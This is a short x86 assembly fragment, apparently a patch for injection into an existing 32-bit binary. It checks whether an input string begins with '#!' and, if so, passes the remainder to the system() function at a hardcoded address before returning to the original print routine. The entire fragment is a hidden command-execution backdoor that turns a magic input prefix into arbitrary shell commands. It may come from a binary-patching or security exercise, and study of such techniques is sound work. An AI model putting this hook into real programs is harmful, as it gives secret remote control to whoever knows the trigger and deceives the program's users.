push 0x08048662;	#skip the following code
ret;
lea eax, [ebp - 0x40C]; #load the address of the string
movzx ebx, byte ptr [eax];
cmp bl, 0x23; 		#check if first char is '#'
jne jmp_before_print;
lea ebx, [eax+1];
movzx ebx, byte ptr [ebx];
cmp bl, 0x21; 		#check if second char is '!'
jne jmp_before_print;
sub esp, 0x10;
lea eax, [eax+2];
push eax;
mov eax, 0x08048460; 	#the address of system function.
call eax;
add esp, 0x10;
push 0x08048662;	#return after the print
ret;


jmp_before_print:	#return to print.
push 0x0804863A;
ret;
